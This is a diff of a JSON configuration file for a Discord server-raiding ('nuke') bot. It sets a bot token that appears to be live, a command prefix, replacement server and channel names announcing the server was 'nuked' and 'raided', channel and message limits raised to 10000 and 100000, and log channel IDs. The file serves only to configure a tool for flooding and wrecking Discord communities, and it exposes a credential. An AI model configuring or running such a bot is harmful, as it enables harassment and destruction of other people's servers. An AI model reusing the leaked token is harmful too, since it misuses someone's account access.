@@ -1,32 +1,32 @@
 {
 
-"token":"ODEwNDk3NjY1NzKujghxxxxxxxxxxxxxxxxxjtjfjfWxY4",
+"token":" MTE1NjYxNzA2MjQxNjkyODc4OA.Ga2Qfy.-QmUfN_U3HqIYyPPZPbOIWVcyV2jetAPK70T_Y"
 
 
-"prefix":".",
+"prefix":"ng!",
 
 
-"invite":"https://discord.gg/xxxxfx",
+"invite":"https://discord.com/invite/X6pVKzXPTz",
 
 
-"nameserver":"NAME SERVER",
+"nameserver":"NUKED BY NAFI GAMER",
 
 
-"channelname":"raid-by-name",
+"channelname":"raided-by-nafi-gamer",
 
-"image":"https://cdn.discordapp.com/attachments/632634089828253771/638024930373533726/tenor.gif",
+"image":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQ1huKv9UefNvLnbDKI6m-Zf9CvlqDAeVppqlW94gDgg&s",
 
 
-"numberchannelmax":"7",
+"numberchannelmax":"10000",
 
-"numbermessagemax":"10",
+"numbermessagemax":"100000",
 
 "numberMPmax":"0",
-"noRaidServerID": "774679325941170212",
-"logschannelid": "810504737119797258",
-"logschannelid2": "none",
-"creditname":"SoW",
-"helpRAIDcommand":"help1212",
+"noRaidServerID": "1156627927421689919",
+"logschannelid": "1159204128833151008",
+"logschannelid2": "1159204128833151008",
+"creditname":"NAFI GAMER",
+"helpRAIDcommand":"nukehelp",
 
 "statusbot": "v$version$ | $servers$ guilds, $members$ members, $prefix$help"
 }
